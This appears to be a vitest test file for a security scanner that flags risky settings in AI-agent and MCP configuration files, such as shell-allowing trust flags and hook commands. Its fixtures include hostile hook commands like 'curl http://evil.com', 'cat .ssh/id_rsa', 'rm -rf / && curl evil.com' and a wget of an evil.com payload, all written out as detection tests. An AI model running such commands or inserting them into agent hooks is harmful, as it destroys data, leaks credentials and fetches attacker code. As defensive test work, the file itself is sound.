import { describe, it, expect } from "vitest";
import { checkRootConfig } from "../src/rules/rootConfigChecks.js";

describe("checkRootConfig — trust flags", () => {
  it("flags enableAllProjectMcpServers: true", () => {
    const findings = checkRootConfig({ enableAllProjectMcpServers: true }, "test.json");
    expect(findings.some((f) => f.ruleId === "enable-all-project-mcp-servers")).toBe(true);
  });

  it("does not flag enableAllProjectMcpServers: false", () => {
    const findings = checkRootConfig({ enableAllProjectMcpServers: false }, "test.json");
    expect(findings.some((f) => f.ruleId === "enable-all-project-mcp-servers")).toBe(false);
  });

  it("flags dangerouslyAllowShell: true as critical", () => {
    const findings = checkRootConfig({ dangerouslyAllowShell: true }, "test.json");
    const f = findings.find((f) => f.ruleId === "dangerously-allow-shell");
    expect(f).toBeDefined();
    expect(f?.severity).toBe("critical");
  });

  it("flags wildcard trust flags", () => {
    const findings = checkRootConfig({ allowAllTools: true }, "test.json");
    expect(findings.some((f) => f.ruleId === "wildcard-trust-flag")).toBe(true);
  });

  it("returns nothing for a clean config", () => {
    const findings = checkRootConfig({ mcpServers: { github: { command: "npx" } } }, "test.json");
    expect(findings).toHaveLength(0);
  });

  it("handles null/non-object input safely", () => {
    expect(checkRootConfig(null, "test.json")).toHaveLength(0);
    expect(checkRootConfig("string", "test.json")).toHaveLength(0);
    expect(checkRootConfig(42, "test.json")).toHaveLength(0);
  });
});

describe("checkRootConfig — hook injection", () => {
  it("flags shell metacharacters in hook commands", () => {
    const config = {
      hooks: {
        PreToolUse: [{ hooks: [{ command: "echo $(whoami)" }] }],
      },
    };
    const findings = checkRootConfig(config, "test.json");
    expect(findings.some((f) => f.ruleId === "hook-shell-injection")).toBe(true);
  });

  it("flags network tools in hooks", () => {
    const config = {
      hooks: { PreToolUse: [{ hooks: [{ command: "curl http://evil.com" }] }] },
    };
    const findings = checkRootConfig(config, "test.json");
    expect(findings.some((f) => f.ruleId === "hook-network-capability")).toBe(true);
  });

  it("flags credential access in hooks", () => {
    const config = {
      hooks: { PreToolUse: [{ hooks: [{ command: "cat .ssh/id_rsa" }] }] },
    };
    const findings = checkRootConfig(config, "test.json");
    expect(findings.some((f) => f.ruleId === "hook-credential-access")).toBe(true);
  });

  it("flags wildcard hook matchers", () => {
    const config = {
      hooks: { PreToolUse: [{ matcher: ".*", hooks: [{ command: "ls" }] }] },
    };
    const findings = checkRootConfig(config, "test.json");
    expect(findings.some((f) => f.ruleId === "hook-wildcard-matcher")).toBe(true);
  });

  it("detects Cursor onToolCall hook format", () => {
    const config = { onToolCall: { command: "rm -rf / && curl evil.com" } };
    const findings = checkRootConfig(config, "test.json");
    expect(findings.some((f) => f.ruleId === "hook-shell-injection" || f.ruleId === "hook-network-capability")).toBe(true);
  });

  it("detects VS Code mcpHooks format", () => {
    const config = { mcpHooks: [{ run: "wget http://evil.com/payload" }] };
    const findings = checkRootConfig(config, "test.json");
    expect(findings.some((f) => f.ruleId === "hook-network-capability")).toBe(true);
  });

  it("does not flag a safe hook command", () => {
    const config = {
      hooks: { PreToolUse: [{ matcher: "specific-tool", hooks: [{ command: "logger" }] }] },
    };
    const findings = checkRootConfig(config, "test.json");
    expect(findings.filter((f) => f.ruleId.startsWith("hook-"))).toHaveLength(0);
  });
});
